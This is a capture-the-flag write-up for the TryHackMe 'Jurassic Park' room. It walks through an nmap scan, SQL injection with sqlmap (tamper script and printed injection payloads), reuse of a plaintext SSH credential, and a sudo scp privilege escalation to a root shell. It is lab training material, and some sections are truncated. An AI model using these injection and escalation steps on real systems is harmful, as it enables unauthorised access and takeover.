## Objective:
**Challenge Link:** [tJurassic Park](https://tryhackme.com/room/jurassicpark)

Enumerate the web application, obtain credentials to the server, and find four flags hidden in the file system.

## Enumeration:

**Port Scanning**

```bash
sudo nmap -sS -F -n 10.10.165.112
Nmap scan report for 10.10.165.112
Host is up (0.14s latency).
Not shown: 98 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.22 seconds
```

visited the website on port 80, while I was viewing the tickets, I modified the URL to the `id=5` parameter, which revealed a ticket priced 0.

To test if the website is vulnerable to SQL injection, add a single quote next to the id `id=5'`, which will break the database query.

we have confiremed that the website is vulnerable to **SQLi**, I used [SQLmap](https://sqlmap.org/) tool to automate the process of detection and exploiting **SQLi vulnerability**.

Before starting the attack, inject a malformed query and check the error message to identify the database.

This confirms that the back-end database is **MySQL**. Now let's start SQLi attack. I added this option `--tamper=space2comment.py` to bypass common WAF filters

```bash
sqlmap -u "http://10.10.165.112/item.php?id=5" --dbs --random-agent  --tamper=space2comment.py

sqlmap identified the following injection point(s) with a total of 261 HTTP(s) requests:

    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=5 AND GTID_SUBSET(CONCAT(0x7162767a71,(SELECT (ELT(3314=3314,1))),0x717a626271),3314)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=5 AND (SELECT 3423 FROM (SELECT(SLEEP(5)))jsGZ)

Used credentials (`dennis:ih8dinos`) to access the machine:

## Initial Access

```bash
ssh dennis@10.10.165.112     
The authenticity of host '10.10.165.112 (10.10.165.112)' can't be established.
ED25519 key fingerprint is SHA256:RgFyYsoL/n7m7p/t714RGHLqLtFNcn/+9tndcXsYijA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
dennis@10.10.165.112's password: 

dennis@ip-10-10-165-112:~$ whoami
dennis
```

The user doesn't have root access. To gain privileged access, the first thing you do is to check what privileged commands your current user is allowed to run with `sudo` without requiring a password.

```bash
dennis@ip-10-10-165-112:~$ ls -al
total 52
drwxr-xr-x 4 dennis dennis 4096 Jul  5 15:27 .

```

## Privilege Escalation

Followed [GTFOBins](https://gtfobins.github.io/gtfobins/scp/) to abuse `scp`.

1. Created a temporary file with a reverse shell payload

```bash
TF=$(mktemp)                      
echo 'sh 0<&2 1>&2' > $TF      
chmod +x "$TF"                    
```

2. Executed scp with the malicious payload

```bash
sudo scp -S $TF x y:                   
```
`-S $TF` tells `scp` to use `$TF` (our script) instead of the default SSH for the connection. Since scp runs as root (via `sudo`), our payload executes with root privileges.
